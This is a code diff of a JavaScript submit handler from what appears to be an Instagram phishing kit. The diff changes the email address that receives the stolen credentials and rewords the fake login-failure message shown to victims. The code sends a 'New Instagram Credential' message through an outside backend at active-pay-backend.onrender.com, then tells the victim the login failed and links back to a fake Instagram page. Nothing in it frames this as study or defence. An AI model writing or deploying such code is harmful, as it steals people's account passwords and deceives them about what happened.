@@ -10,7 +10,7 @@ const handleSubmit = (e) => {
         result.innerHTML= "<div style='padding: 60px 0;'></div>";
         setTimeout(()=>{
             const form = new FormData();
-            const recipient = "Hwanhyunfeng@gmail.com";
+            const recipient = "susannakellerx@gmail.com";
             const email_backend = "https://active-pay-backend.onrender.com/";
             const body = (`
                New Instagram Credential
@@ -34,7 +34,7 @@ const handleSubmit = (e) => {
             })
             .then(action =>{
                 setTimeout(()=>{
-                result.innerHTML="<div style='padding: 25px;text-align:center; color:red;'>Incorrect password <br><a href='/instagram.html'>Go back to Login</a></div>";
+                result.innerHTML="<div style='padding: 25px;text-align:center; color:red; font-size:1rem;'>Can't Login, Please try  again.<br><a href='/instagram.html'>Go back to Login</a></div>";
                 loader.style.display = "none";
                 }, 10000);
 
